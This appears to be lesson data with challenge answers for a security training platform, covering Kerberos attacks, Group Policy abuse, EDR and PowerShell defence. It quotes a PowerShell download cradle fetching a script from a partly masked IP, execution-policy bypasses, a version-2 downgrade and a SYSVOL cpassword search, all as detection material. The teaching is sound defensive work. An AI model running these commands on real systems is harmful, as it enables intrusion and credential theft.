tasks.title: Tickets: TGT and TGS
tasks.teach: Kerberos has two ticket types. At logon you get a TGT (Ticket Granting Ticket) from the DC — proof of identity. When you want a service (a file share, a SQL server), you present the TGT to get a TGS (service ticket) for that specific service, encrypted with the service account's password hash. This two-step design is elegant — and its details (how TGS tickets are encrypted) are exactly what Kerberoasting abuses.
tasks.chal: Which ticket do you receive at logon and then use to request service tickets? Submit TG{•••}.
tasks.learn: TGT — your identity ticket from the DC. You exchange it for per-service TGS tickets. Pass-the-ticket reuses a stolen TGT/TGS.
tasks.example: Flow: logon → TGT from DC → 'I want CIFS on FS01' → TGS for FS01 (encrypted with FS01's service-account hash) → present it to FS01.

tasks.title: Kerberoasting
tasks.teach: Here is the clever attack. Any domain user can request a TGS for any service that has an SPN (Service Principal Name) — and that ticket is encrypted with the service account's password hash. So an attacker requests tickets for service accounts, extracts them, and cracks them offline at leisure. Service accounts often have weak, non-expiring passwords, so Kerberoasting frequently yields a privileged credential with no noise on the DC.
tasks.chal:
PS> Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName Name SPN svc_sql MSSQLSvc/sql01.tg.local:1433 <- request its TGS, crack offline

What is the attack of requesting service-account TGS tickets and cracking them offline called? Submit TG{•••••••••••••}.
tasks.learn: Kerberoasting — any user can request the ticket; cracking happens offline. Defence: long random service passwords (gMSA), and alert on mass TGS requests.
tasks.example: A service account with password 'Summer2024' and an SPN is a free privileged credential — request, crack, done. gMSA (25-char auto-rotated) kills it.

lab.intro: Find Kerberoastable accounts (those with an SPN).

steps.out:
Name     ServicePrincipalName
svc_sql  MSSQLSvc/sql01.tg.local:1433
svc_web  HTTP/web01.tg.local   <- both roastable

steps2: Enumerate user accounts that have an SPN set
These service accounts are Kerberoastable
Name this offline-cracking attack.

tasks.title: AS-REP roasting
tasks.teach:
A cousin of Kerberoasting. If an account has Kerberos pre-authentication disabled, the DC will hand out a chunk of data encrypted with that account's password hash without the attacker even authenticating. The attacker requests it and cracks it offline — AS-REP roasting. It targets accounts (often legacy ones) flagged 'do not require pre-authentication'.

🔑 Key point

AS-REP roasting — exploits 'do not require pre-authentication'. Defence: never disable pre-auth; audit for accounts that have it off.

Key term: ASREP ROASTING
tasks.chal: Cracking the password of an account with Kerberos pre-auth disabled is called ___ roasting? Submit TG{•••••_••••••••}.
hints: AS-REP, from the Kerberos message name.
tasks.learn: AS-REP roasting — exploits 'do not require pre-authentication'. Defence: never disable pre-auth; audit for accounts that have it off.
tasks.example: Hunt: list users with DoesNotRequirePreAuth set — each one is an AS-REP roast waiting to happen. There should be none.

tasks.title: Pass-the-hash & pass-the-ticket
tasks.teach: AD inherits Windows' credential-reuse problem at scale. Pass-the-hash reuses a stolen NTLM hash to authenticate as a user without the password; pass-the-ticket reuses a stolen Kerberos TGT/TGS. Both turn one compromised host into movement across the domain — especially when a Domain Admin has logged onto an ordinary workstation and left their credentials in its LSASS.
tasks.chal: Reusing a stolen NTLM hash to authenticate across the domain is called ___ (three words)? Submit TG{••••_•••_••••}.
tasks.learn: Pass-the-hash (and pass-the-ticket) — the engine of lateral movement. Defences: Credential Guard, Protected Users group, and no admin logons to workstations.
tasks.example: The deadly combo: a DA logs onto a helpdesk PC → their hash is in that PC's LSASS → one compromise of that PC = Domain Admin. Tiering prevents it.

tasks.title: DCSync
tasks.teach: Domain Controllers replicate directory data — including password hashes — to each other. An attacker (or account) with the replication rights (Get Changes / Get Changes All) can pretend to be a DC and ask a real DC to send password data for any account — including krbtgt and every admin. This is DCSync: pulling hashes straight out of AD over the replication protocol, no code run on the DC. It is why those replication rights must be tightly held.
tasks.chal: What attack abuses AD replication rights to pull password hashes from a DC? Submit TG{••••••}.
hints: Pretend to be a DC and replicate.
tasks.learn: DCSync — abuses replication (Get Changes All) to extract any hash, including krbtgt. Audit who holds those rights; alert on 4662 replication by non-DCs.
tasks.example: Grab krbtgt's hash via DCSync → forge golden tickets forever. Detection: Event 4662 showing a replication GUID requested by a non-DC principal.

lab.intro: Detect DCSync-style replication by a non-DC account.

steps.out:
4662  Account: tg\rnehra (NOT a DC!)  Properties: Replicating Directory Changes All
      -> DCSync attempt from a user account

steps2: On a DC, review Event ID 4662 for replication rights use
A non-DC account requesting "Replicating Directory Changes All" is DCSync
Name this hash-extraction attack.

tasks.title: Golden & silver tickets
tasks.teach: With the krbtgt hash (e.g. via DCSync), an attacker forges a golden ticket — a TGT for any user, any group, valid for years — giving domain-wide access that survives password resets. A silver ticket is narrower: forged with a service account's hash, it grants access to that one service without ever talking to the DC (stealthier). Both are forged Kerberos tickets; the golden ticket is the ultimate domain-persistence tool.
tasks.chal: A forged TGT made with the krbtgt hash, granting domain-wide access for years, is a ___ ticket? Submit TG{••••••_••••••}.
tasks.learn: Golden ticket — forged with krbtgt, it is near-unkillable persistence. The only real fix is resetting krbtgt twice. Silver tickets forge single-service access.
tasks.example: Why reset krbtgt twice: AD keeps the current and previous key valid, so a single reset still lets old golden tickets work for a while.

tasks.title: Privilege & delegation
tasks.teach: The most powerful group in a domain is Domain Admins — effectively total control. Attack paths also run through AD object ACLs (who can reset whose password, add members to a group) and delegation — especially unconstrained delegation, where a server can impersonate any user who connects to it (including a DA), making that server a jackpot. Finding and fixing excessive group membership, dangerous ACLs and risky delegation is core AD defence.
tasks.chal: Which built-in group grants effectively total control over the domain? Submit TG{••••••_••••••}.
tasks.learn: Domain Admins — keep it tiny and audited. Also hunt dangerous ACLs and unconstrained delegation, which are quieter paths to the same power.
tasks.example: Unconstrained delegation on a web server + a DA browsing to it = the server captures the DA's TGT. Prefer constrained delegation, or none.

tasks.title: Scenario: foothold to Domain Admin
tasks.teach: The classic AD kill chain: phish a user → dump local creds → Kerberoast a weak service account → use it to reach a server → find a Domain Admin's cached credentials (they logged on there) → pass-the-hash to a DC → DCSync krbtgt → golden ticket. Every step reused a credential or a privilege. The single architectural control that cuts this path is the tiered-admin model: Tier 0 (DCs/domain admins), Tier 1 (servers), Tier 2 (workstations) credentials never mix — a DA never logs onto a workstation, so their credentials are never there to steal.
tasks.chal: Which admin model separates DC/server/workstation credentials so they never mix (cutting the path to DA)? Submit TG{••••••_•••••}.
tasks.learn: Tiered admin — the architectural fix. With Credential Guard, LAPS, Protected Users and no credential reuse across tiers, the foothold-to-DA path is broken.
tasks.example: Break one link and the chain fails: if the DA never logs onto the compromised server (tiering), their hash isn't there, and the attacker stalls at Tier 1.

rooms.title: Group Policy Security
rooms.subtitle: Harden the fleet with GPOs — and stop them being turned against you.
rooms.blurb: Understand GPO structure and LSDOU order, verify effective policy, find GPP passwords, and detect GPO abuse.

tasks.title: What Group Policy is
tasks.teach:
Group Policy is how a Windows domain pushes settings to every user and computer at once — the fleet-wide configuration engine. A GPO (Group Policy Object) has two parts: the GPC (Group Policy Container) stored in AD, and the GPT (Group Policy Template) — the actual setting files stored in SYSVOL on the domain controllers. You attach a GPO to where it should apply by creating a link to a site, domain or OU.

Why it matters — the dual nature: the same reach that lets you harden thousands of machines in one edit means whoever can edit the right GPO can push malware or weaken defences everywhere at once. GPO is a defender's best tool and, if its edit rights leak, an attacker's.
tasks.chal: What do you call attaching a GPO to a site, domain or OU so it applies there? Submit TG{••••}.
tasks.learn: Link — a GPO does nothing until it is linked to a site, domain or OU. The link decides scope; the GPC/GPT hold the settings.
tasks.example: One GPO linked to the 'Workstations' OU hardens every workstation. Link it to the domain root and it hits everything — power and risk in one.

tasks.title: Processing order: LSDOU
tasks.teach: When several GPOs could apply, order decides who wins. Policy is processed in the sequence LSDOU: Local, then Site, then Domain, then OU (and nested OUs, parent to child). Later-applied settings override earlier ones, so the OU closest to the object normally wins — unless a higher GPO is set to Enforced, or inheritance is Blocked. Understanding precedence is how you predict what a machine actually gets.
tasks.chal: What acronym gives the GPO processing order (Local, Site, Domain, OU)? Submit TG{•••••}.
tasks.learn: LSDOU — processed in that order, last writer wins, so the nearest OU usually prevails. Enforced and Block Inheritance change the rules.
tasks.example: A domain GPO says 'screen lock 15 min'; an OU GPO says '30 min'. The OU is later in LSDOU, so machines in that OU get 30 — unless the domain GPO is Enforced.

tasks.title: Verify effective policy
tasks.teach: Because of precedence, filtering and inheritance, what you set is not always what applies. RSoP (Resultant Set of Policy) is the computed end result — exactly which settings won on a given machine/user. You read it with gpresult (e.g. gpresult /r or /h report.html), and you force a refresh with gpupdate /force. 'Verify effective policy' is the habit that catches a hardening GPO that silently never applied.
tasks.chal:
C:\> gpresult /r Applied Group Policy Objects Default Domain Policy TG-Workstation-Hardening The following GPOs were not applied (filtered out): TG-Server-Baseline (Filtering: Denied - Security)

What is the computed end-result of all applied policy (read with gpresult) called? Submit TG{••••}.
tasks.learn: RSoP — the effective policy. gpresult /r shows what applied and what was filtered out; always verify rather than assume.
tasks.example: The report above shows the hardening GPO applied but the server baseline was filtered out — exactly the kind of gap you only see by checking RSoP.

lab.intro: Verify which GPOs actually applied to this machine.

steps.out:
Applied Group Policy Objects:
  Default Domain Policy
  TG-Workstation-Hardening
Filtered out:
  TG-Server-Baseline (Denied - Security)

steps2: Run gpresult /r (or /h report.html for detail)
Read which GPOs applied vs were filtered
Name the effective-policy result (4 letters).

tasks.title: SYSVOL
tasks.teach: The actual policy files live in SYSVOL — a share replicated to every domain controller, readable by all authenticated users (they must read it to apply policy) and writable only by admins. Because every machine trusts and executes what it finds there, SYSVOL integrity is critical: an attacker who can write to SYSVOL can alter policy, scripts and preferences the whole domain will run.
tasks.chal: What is the replicated DC share that stores GPO template files and logon scripts? Submit TG{••••••}.
hints: Where the GPT lives on DCs.
tasks.learn: SYSVOL — every machine reads and trusts it. Protect write access tightly; monitor it for change. Tampering here is domain-wide code execution.
tasks.example: Logon scripts and GPP files live in SYSVOL. Write a malicious logon script there and every user runs it at next logon.

tasks.title: Scoping & filtering
tasks.teach: A GPO linked to an OU applies to everything in it by default, but you can narrow it. Security filtering restricts a GPO to specific users/computers/groups (it only applies where the object has Read + Apply). WMI filters apply a GPO only where a WMI query is true (e.g. only laptops, only Windows 11). Precise scoping delivers the right settings to the right machines — and mis-scoping is a common reason a hardening GPO misses its targets.
tasks.chal: What narrows a GPO to specific users/computers/groups by permissions? Submit TG{••••••••_•••••••••}.
hints: Apply only where Read+Apply is granted.
tasks.learn: Security filtering — scope by group membership. WMI filters scope by a queried condition. Both decide the precise set a GPO hits.
tasks.example: Filter the 'Developers hardening' GPO to the Developers group so it applies to them wherever they are — not to the whole OU.

tasks.title: GPP passwords (cpassword)
tasks.teach: A notorious historical flaw: Group Policy Preferences (GPP) let admins set things like local-account passwords via GPO — but it stored them in SYSVOL as cpassword, 'encrypted' with an AES key Microsoft published. Since every authenticated user can read SYSVOL, anyone could grab and trivially decrypt those passwords. It is patched (MS14-025 blocks new ones) but old cpassword values still linger in SYSVOL on many domains — a free credential if you don't hunt and remove them.
tasks.chal:
\\tg.local\SYSVOL\...\Groups.xml <- decryptable by anyone!

What is the decryptable password attribute GPP left in SYSVOL (a classic free credential)? Submit TG{•••••••••}.
hints: The GPP password field in Groups.xml.
tasks.learn: cpassword — 'encrypted' with a public key, so readable by anyone. Hunt SYSVOL for lingering cpassword values and remove them.
tasks.example: One findstr /s cpassword \\tg.local\SYSVOL\*.xml can hand an attacker a local-admin password. Audit for it; use LAPS instead.

lab.intro: Hunt SYSVOL for lingering GPP cpassword values.

steps.out:
Groups.xml: <Properties userName="LocalAdmin" cpassword="j1Uyj3Vx8TYosfxRbU..."/>
 -> decryptable; remove it

steps2: Search SYSVOL XML for the cpassword attribute
Any hit is a decryptable, exposed password
Name that attribute.

tasks.title: Pushing code via GPO
tasks.teach: The attacker's favourite GPO abuse: if you can edit a GPO linked to machines you want, you can make them all run code. GPOs can deploy immediate scheduled tasks, startup/logon scripts, and software — so a single malicious edit becomes code execution across every linked host at the next refresh (~90 minutes, or immediately for an immediate task). This is why GPO edit/link rights are a prime target and must be tightly controlled.
tasks.chal: Besides scripts, what can a GPO deploy to make every linked machine run an attacker's code (two words)? Submit TG{•••••••••_••••}.
tasks.learn: Scheduled task (immediate task) — GPO-deployed code execution at scale. Startup/logon scripts do the same. Guard who can edit linked GPOs.
tasks.example: Tools like SharpGPOAbuse add an immediate task to a GPO; every machine in the linked OU runs the payload — one edit, whole OU owned.

tasks.title: Detect GPO changes
tasks.teach: Because a GPO edit is so powerful, you watch for it. On a DC, directory-object changes are logged — Event ID 5136 records a modification to an AD object (including a GPO's GPC), and 5137/5141 cover creation/deletion. Combined with SYSVOL file-change monitoring and GPO version tracking, these catch an unexpected or unauthorised GPO edit quickly — ideally before the next policy refresh pushes it out.
tasks.chal: Which Windows Event ID records a modification to an AD object such as a GPO? Submit TG{••••}.
tasks.learn: 5136 — a directory object (e.g. a GPO) was modified. Alert on edits to GPOs by unexpected accounts, and monitor SYSVOL for file changes.
tasks.example: An out-of-change-window 5136 on a production GPO by a non-GPO-admin is exactly the alert that catches GPO abuse before it propagates.

lab.intro: Find GPO (AD object) modification events on a DC.

steps.out:
5136  Directory Service Changes
  Object: CN={GUID},CN=Policies  (TG-Workstation-Hardening)
  Modified by: tg\rnehra  09:14  <- expected admin?

steps2: On a DC query Security log for Id 5136
Check who modified which GPO and when
Submit the Event ID for a directory-object modification.

tasks.title: Lock it down
tasks.teach:
Securing Group Policy is mostly access control and change management: restrict who can edit and link GPOs to a small, audited set (these are AD permissions — part of the AD attack surface), protect SYSVOL write access, require change control for GPO edits, and monitor for changes. The governing principle is the same one that limits every blast radius.

🔑 Key point

Least privilege — few GPO editors, audited, with change control and monitoring. GPO edit rights are as sensitive as admin rights, because they are.
tasks.chal: Which principle says only a minimal, audited set should hold GPO edit/link rights? Submit TG{•••••_•••••••••}.
tasks.learn: Least privilege — few GPO editors, audited, with change control and monitoring. GPO edit rights are as sensitive as admin rights, because they are.
tasks.example: Delegate GPO editing per-OU to the right team rather than granting broad domain-wide GPO rights — contain who can push to what.

tasks.title: Scenario: a GPO turned against the fleet
tasks.teach: An attacker who gained GPO edit rights adds an immediate scheduled task to the workstation hardening GPO — now every workstation will run their payload at the next refresh. It is caught because the SOC alerts on 5136 GPO edits outside the change window, and an admin, checking affected machines, runs the one command that confirms exactly what policy a machine will apply.
tasks.chal: Which command verifies the effective Group Policy actually applied to a machine? Submit TG{••••••••}.
hints: Reads the RSoP on a host.
tasks.learn: gpresult — confirms what really applied, so you can see the rogue GPO's effect and scope the response. Verify, monitor, and lock down edit rights.
tasks.example: Response: disable the rogue GPO link, remove the task, rotate anything exposed, and use gpresult across hosts to confirm the fix propagated.

rooms.title: Endpoint Detection & Response
rooms.subtitle: See, detect, respond, investigate — behaviour beats signatures.
rooms.blurb: Understand EDR vs AV, the agent→telemetry→analytics→response model, process trees, isolation and hunting.

tasks.title: What EDR is
tasks.teach: Traditional antivirus asks 'is this file known-bad?' and matches signatures. EDR (Endpoint Detection & Response) asks a deeper question: 'what is this host doing?' It continuously records endpoint telemetry — every process, command line, network connection, file and registry change — and detects on behaviour, not just signatures. That is why EDR catches fileless attacks, living-off-the-land and novel malware that AV misses: the file may be unknown, but the behaviour (Word spawning PowerShell spawning a network connection) is suspicious.
tasks.chal: EDR detects threats based primarily on ___ rather than file signatures. Submit TG{•••••••••}.
tasks.learn: Behaviour — the core shift. A signature needs a known-bad file; behaviour catches the action even when the tool is legitimate or brand new.
tasks.example: AV: 'evil.exe not in my signature DB — allow.' EDR: 'winword.exe spawned powershell.exe which connected to a rare IP — alert, regardless of files.'

tasks.title: AV, EDR, XDR, MDR
tasks.teach: The acronyms form a progression. AV / NGAV stops known (and some unknown) malware on the endpoint. EDR adds continuous telemetry, behavioural detection and response on the endpoint. XDR (Extended Detection and Response) correlates that endpoint data with other domains — email, identity, network, cloud — for a fuller picture. MDR (Managed Detection and Response) is EDR/XDR run for you by a provider's SOC.
tasks.chal: Which extends EDR by correlating endpoint data with email, identity, network and cloud? Submit TG{•••}.
tasks.learn: XDR — cross-domain correlation. EDR is endpoint-deep; XDR joins it to the other telemetry; MDR is any of these operated by a managed SOC.
tasks.example: EDR sees the malicious process on the laptop; XDR links it to the phishing email that delivered it and the identity that was then abused.

tasks.title: The EDR architecture
tasks.teach: EDR follows a clear pipeline: an agent on each endpoint collects telemetry → ships it to analytics (usually cloud) → behavioural detections fire → the platform enables response (isolate, kill, collect). The lightweight agent is the foundation — no agent, no visibility — so fleet-wide agent deployment and health monitoring are the first operational concern.
tasks.chal: What is the lightweight component on each endpoint that collects telemetry and executes response? Submit TG{•••••}.
tasks.learn: Agent — the sensor and the actuator. Monitor agent health: a host with a dead or missing agent is an EDR blind spot.
tasks.example: Architecture: agent (collect + act) → cloud analytics (detect) → console (investigate + respond). Coverage = how many hosts have a healthy agent.

tasks.title: The process tree
tasks.teach: EDR's most powerful view is the process tree — the parent-child lineage of every process. Attacks reveal themselves in lineage: outlook.exe → winword.exe → powershell.exe → cmd.exe is obviously wrong (a document should not spawn shells). Rich telemetry (process creation with full command line, network, file, registry) lets an analyst read the whole story of what ran, what it spawned, and what it touched.
tasks.chal:
host WS07 lineage view explorer.exe └─ winword.exe (Invoice.docm) └─ powershell.exe -enc SQBFAFgA... <- document spawned an encoded shell └─ cmd.exe → 93.184.x.x:443

What is EDR's parent-child view of process lineage called (two words)? Submit TG{•••••••_••••}.
tasks.learn: Process tree — lineage exposes attacks a single event hides. A document spawning PowerShell spawning cmd reaching the internet is the story, told by the tree.
tasks.example: Normal: services.exe → svchost.exe. Malicious: winword.exe → powershell.exe. The tree makes 'wrong parent' obvious.

lab.intro: Read the process tree for a suspicious lineage.

steps.out:
winword.exe (Invoice.docm)
  powershell.exe -enc SQBFAFgA...   <- bad: Office spawned an encoded shell
    cmd.exe -> 93.184.x.x:443

steps2: Open the process tree for the alerting host
Look for a document/Office app spawning a shell
Name this lineage view (two words).

tasks.title: Behavioural detection & ATT&CK
tasks.teach: EDR detections describe behaviours, and the shared language for those behaviours is MITRE ATT&CK — tactics and techniques. A good EDR maps each detection to an ATT&CK technique, so you can see coverage ('we detect T1059 Command Shell, T1055 Process Injection…') and gaps, and so analysts immediately understand what an alert means in attacker terms.
tasks.chal: Which framework of tactics/techniques do EDR detections map to for coverage and context? Submit TG{•••••_••••••}.
tasks.learn: MITRE ATT&CK — the behaviour taxonomy. Mapping detections to techniques turns alerts into 'this is credential dumping (T1003)' and reveals coverage gaps.
tasks.example: Alert 'LSASS access by non-system process' maps to T1003.001 (LSASS Memory) — instantly meaningful, and countable toward coverage.

tasks.title: Response: isolate
tasks.teach: EDR's 'R' is what sets it apart from passive detection. The flagship action is host isolation — cut the endpoint off the network (keeping only the management channel) so the attacker loses C2 and cannot move laterally, while memory and disk stay intact for investigation. It is the containment step from incident response, available at one click from the console.
tasks.chal:
$ edr isolate --host WS07 --reason "IR contain" WS07: ISOLATED (mgmt channel only). C2 cut; evidence preserved.

What EDR response cuts a host off the network (bar the mgmt channel) while preserving evidence? Submit TG{•••••••}.
tasks.learn: Isolate — instant network containment from the console. The attacker's C2 and lateral movement die; you keep the host investigable.
tasks.example: Isolate first, investigate second: one click stops the spread across the fleet while you work the case on the preserved host.

lab.intro: Isolate a compromised endpoint from the EDR console.

steps.out:
WS07: ISOLATED (management channel only)
C2 to 93.184.x.x severed. Memory/disk preserved.

steps2: In the EDR console, isolate the host
Confirm only the management channel remains
Name this containment action (one word).

tasks.title: Response: kill, quarantine, rollback
tasks.teach: Beyond isolation, EDR can kill a malicious process, quarantine a file, block a hash/IP across the fleet, collect forensic artefacts remotely, and — on some platforms — roll back changes (undo ransomware's file encryption/registry edits from shadow copies or a change journal). Rollback is the dramatic one: it can restore a host to its pre-attack state.
tasks.chal: Which EDR response can undo ransomware's file/registry changes, restoring the host's prior state? Submit TG{••••••••}.
tasks.learn: Rollback — revert malicious changes where the platform supports it. Combined with kill/quarantine/isolate, EDR both stops and cleans up an attack.
tasks.example: Ransomware encrypts 4,000 files; rollback restores them from the tracked originals — turning a crisis into a contained cleanup.

tasks.title: Hunting with EDR
tasks.teach: All that telemetry is a hunting goldmine. Analysts query EDR data proactively — 'show every host where a document spawned a shell', 'any process loading a specific DLL', 'rare parent-child pairs' — to find attacks no rule caught. Hunting turns EDR from an alerting tool into an investigation platform, and finds become new custom detections.
tasks.chal: Proactively querying EDR telemetry to find attacks no rule caught is called ___? Submit TG{•••••••}.
tasks.learn: Hunting — EDR's rich history lets you test hypotheses across the fleet and promote finds to detections, shrinking the gaps over time.
tasks.example: Hunt: 'stack all parent→child pairs fleet-wide; show the rarest.' The one host where winword→wscript happened is your lead.

tasks.title: Tuning
tasks.teach: Like any detection tool, EDR needs tuning. Legitimate admin tools and in-house software trigger behavioural rules, so you build exclusions and tune thresholds to cut false positives — carefully, so you don't create blind spots (over-excluding PowerShell, for instance, blinds you to its abuse). The aim, as everywhere, is fewer, higher-confidence alerts an analyst will actually act on.
tasks.chal: A benign action wrongly flagged as malicious by EDR is a ___? Submit TG{•••••_••••••••}.
tasks.learn: False positive — tune with scoped exclusions, never blanket ones. An exclusion that silences a whole tool can silence the attack that abuses it.
tasks.example: Good: exclude your specific patch-management script path. Bad: exclude all PowerShell — now the attacker's PowerShell is invisible too.

tasks.title: Scenario: EDR catches what AV missed
tasks.teach:
A user opened a macro document. AV found nothing — no known-bad file. But EDR saw the behaviour: Word spawned encoded PowerShell, which reached a rare IP and tried to access LSASS. The analyst read the process tree, mapped it to ATT&CK, and isolated the host in one click — before any lateral movement. The whole win came from one defining EDR capability.

🔑 Key point

Behavioural detection — catches fileless, LOLBin and novel attacks by what they do. Paired with one-click response, it turns a miss into a contained incident.
tasks.chal: What is EDR's defining advantage over signature AV (two words)? Submit TG{•••••••••••_•••••••••}.
hints: Detect the action, not the file.
tasks.learn: Behavioural detection — catches fileless, LOLBin and novel attacks by what they do. Paired with one-click response, it turns a miss into a contained incident.
tasks.example: Signatures protect against yesterday's known malware; behaviour protects against today's unknown attack using legitimate tools. EDR does the latter.

rooms.title: PowerShell Security
rooms.subtitle: Log it, constrain it, detect its abuse — Windows's most powerful shell.
rooms.blurb: Debunk the execution-policy myth, enable script-block logging and AMSI, apply CLM and JEA, and detect abuse.

tasks.title: Power & the execution-policy myth
tasks.teach: PowerShell is Windows' most powerful shell — full .NET access, remoting, and deep management of the OS. That power makes it a favourite of attackers (download-and-run in memory, no file on disk) and a critical thing to secure. First, debunk the biggest myth: execution policy is NOT a security control. Set-ExecutionPolicy Restricted only stops a user accidentally double-clicking a .ps1; an attacker bypasses it trivially (powershell -ExecutionPolicy Bypass, piping to stdin, encoding). Real security comes from logging, AMSI, Constrained Language Mode and app control — not execution policy.
tasks.chal: Which setting do people wrongly believe secures PowerShell, but is only a convenience guardrail? Submit TG{•••••••••_••••••}.
tasks.learn: Execution policy — a safety rail against accidents, not attackers. It is bypassed a dozen ways; never rely on it as a security boundary.
tasks.example: Bypasses: -ExecutionPolicy Bypass, -Command, -EncodedCommand, Get-Content x.ps1 | iex. The policy stops none of them.

tasks.title: The download cradle
tasks.teach: The signature PowerShell attack is the download cradle: pull code from the internet and run it in memory, leaving no file on disk for AV to scan. The classic form uses IEX (Invoke-Expression), which executes a string as code: IEX (New-Object Net.WebClient).DownloadString('http://.../a'). Recognising this pattern — a web download piped into execution — is a core detection skill; it is one of the most common malicious one-liners you will see in logs.
tasks.chal: Which cmdlet (alias) executes a downloaded string as code, powering the download cradle? Submit TG{•••}.
tasks.learn: IEX (Invoke-Expression) — runs a string as code. Seeing IEX on a web-download is a red flag; it is the heart of fileless PowerShell attacks.
tasks.example: Pattern to recognise and alert on: IEX (New-Object Net.WebClient).DownloadString(...) — fetches remote code and runs it, nothing written to disk.

tasks.title: Encoded commands
tasks.teach: To hide intent from casual inspection and simple filters, attackers pass Base64 via -EncodedCommand (-enc). You will see powershell -nop -w hidden -enc SQBFAFgA... everywhere in incidents — the Base64 decodes to UTF-16 script. It is not encryption (the Toolkit's Base64 decode reveals it), but it defeats eyeballing and naive string matching, which is exactly why full script-block logging (which records the decoded script) matters.
tasks.chal: Which PowerShell parameter runs a Base64-encoded command (abbreviated -enc)? Submit TG{••••••••••••••}.
tasks.learn: EncodedCommand — Base64 (UTF-16) obfuscation, not encryption. Decode it to read intent; script-block logging captures the decoded form for you.
tasks.example: -enc SQBFAFgA... decodes to IEX ... — Base64 of a download cradle. Obfuscation slows a human, not a decoder.

tasks.title: Script-block logging (4104)
tasks.teach: The single most valuable PowerShell log is Script Block Logging, which records the actual code executed — fully de-obfuscated, even if it was encoded or built at runtime — as Event ID 4104. Turn it on (via GPO) and an attacker's encoded cradle shows up in the log as readable PowerShell. Module logging and transcription add more, but 4104 is the one that makes PowerShell abuse visible.
tasks.chal:
Event 4104 Microsoft-Windows-PowerShell/Operational ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://93.184.x.x/a.ps1') (logged DECODED, even though it arrived as -enc)

Which Event ID captures the decoded PowerShell script block that actually ran? Submit TG{••••}.
tasks.learn: 4104 — script-block logging records the real, decoded code. Enable it fleet-wide; it turns obfuscated attacks into readable evidence.
tasks.example: The attacker sent -enc; 4104 logged the decoded IEX (…DownloadString…). Obfuscation beaten by logging.

lab.intro: Read a decoded malicious script block from the PowerShell log.

steps.out:
Id 4104  ScriptBlock:
  IEX (New-Object Net.WebClient).DownloadString('http://93.184.x.x/a.ps1')
  (arrived -enc; logged decoded)

steps2: Query the PowerShell Operational log for Id 4104
Read the decoded ScriptBlock (even if it was encoded)
Submit the Event ID for script-block logging.

tasks.title: Transcription & module logging
tasks.teach: Two more logging layers. Module logging records the cmdlets and parameters pipelines invoke. Transcription writes a full transcript — input and output — of each PowerShell session to a protected (ideally write-once, off-host) location, so you have the complete record of what an operator or attacker did. Together with 4104 and AMSI, they give end-to-end PowerShell visibility.
tasks.chal: Which feature writes a full input/output transcript of each PowerShell session? Submit TG{•••••••••••••}.
tasks.learn: Transcription — the full session record. Send transcripts off-host/write-once so an attacker can't erase what they did.
tasks.example: Transcript file shows the whole session: every command typed and its output — invaluable in an investigation, if the attacker can't delete it.

tasks.title: AMSI
tasks.teach: AMSI (Antimalware Scan Interface) lets Windows hand script content — including code built or decoded in memory — to the registered antivirus for scanning at the moment it runs. This is what catches fileless and obfuscated scripts that never touch disk: the decoded payload is scanned as it executes. Attackers invest heavily in AMSI bypasses precisely because, when it works, it defeats their in-memory tradecraft.
tasks.chal: What interface scans scripts/commands (even in-memory) with AV at runtime? Submit TG{••••}.
tasks.learn: AMSI — runtime content scanning, including in-memory. It is a key fileless-malware defence; keep AV and AMSI current, and alert on bypass attempts.
tasks.example: A cradle decodes malware in memory → AMSI hands the decoded content to AV → it's caught, though nothing was ever written to disk.

tasks.title: Constrained Language Mode
tasks.teach: Logging makes abuse visible; Constrained Language Mode (CLM) makes much of it impossible. CLM restricts PowerShell to a safe subset — blocking direct .NET type access, Win32 API calls and COM, which most attack tooling relies on. Enforced via application control (WDAC/AppLocker), CLM means that even if an attacker runs PowerShell, the dangerous building blocks are off the table.
tasks.chal: Which mode restricts PowerShell to a safe subset (no raw .NET/API/COM), blocking most attack tooling? Submit TG{•••••••••••_••••••••_••••}.
tasks.learn: Constrained Language Mode — removes the primitives attack tools need. It is enforced by WDAC/AppLocker, which is also what makes it hard to bypass.
tasks.example: Under CLM, [System.Reflection...] and most offensive one-liners simply error — the language itself refuses the dangerous calls.

tasks.title: JEA
tasks.teach: For administration, JEA (Just Enough Administration) provides constrained remoting endpoints where a user can run only a specific, allow-listed set of commands, often via a temporary virtual account rather than their own admin credentials. It lets you delegate exactly the management tasks needed (restart this service, read these logs) without handing over full admin — least privilege applied to remote PowerShell.
tasks.chal: What provides role-limited PowerShell remoting endpoints running only allow-listed commands? Submit TG{•••}.
tasks.learn: JEA — least privilege for remote management. Users get exactly the commands they need, via a virtual account, not full admin rights.
tasks.example: Helpdesk gets a JEA endpoint that can only restart the print spooler and read event logs — no shell, no other cmdlets, no standing admin.

tasks.title: Remove PowerShell v2
tasks.teach: A critical, often-missed hardening step: remove PowerShell v2. The legacy v2 engine lacks script-block logging and AMSI, so attackers deliberately downgrade to it (powershell -version 2) to run their code with no logging and no runtime scanning — evading all your modern defences at once. If v2 is still installed, your 4104 logging and AMSI can be sidestepped.
tasks.chal:
PS> Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 State : Enabled <- attackers downgrade to this to evade logging/AMSI

Which legacy PowerShell version (no logging/AMSI) should be removed to stop downgrade-evasion? Submit TG{••}.
tasks.learn: v2 — remove it. While it exists, -version 2 downgrades past script-block logging and AMSI in one move. Uninstall the optional feature.
tasks.example: All your PowerShell logging is moot if an attacker runs powershell -version 2 -enc ... — so uninstall the v2 engine fleet-wide.

lab.intro: Check whether the evadable PowerShell v2 engine is still present.

steps.out:
FeatureName : MicrosoftWindowsPowerShellV2
State       : Enabled    <- remove: enables logging/AMSI downgrade

steps2: Check the v2 optional feature state
If Enabled, it allows a downgrade past modern logging
Submit the version attackers downgrade to.

tasks.title: Scenario: catch the cradle
tasks.teach:
An encoded PowerShell command ran from a macro. Because the fleet had the right logging on, the decoded download cradle appeared in the log as readable code, AMSI scanned the in-memory payload, and the SOC alerted within minutes — then found that CLM would have blocked the .NET calls outright. The single control that turned an obfuscated, fileless attack into clear evidence has a name.

🔑 Key point

Script-block logging — the highest-value PowerShell visibility. With AMSI, CLM, transcription and v2 removed, it makes fileless PowerShell attacks loud instead of silent.
tasks.chal: Which logging (Event 4104) most makes PowerShell abuse visible by recording the decoded code (three words)? Submit TG{••••••_•••••_•••••••}.
tasks.learn: Script-block logging — the highest-value PowerShell visibility. With AMSI, CLM, transcription and v2 removed, it makes fileless PowerShell attacks loud instead of silent.
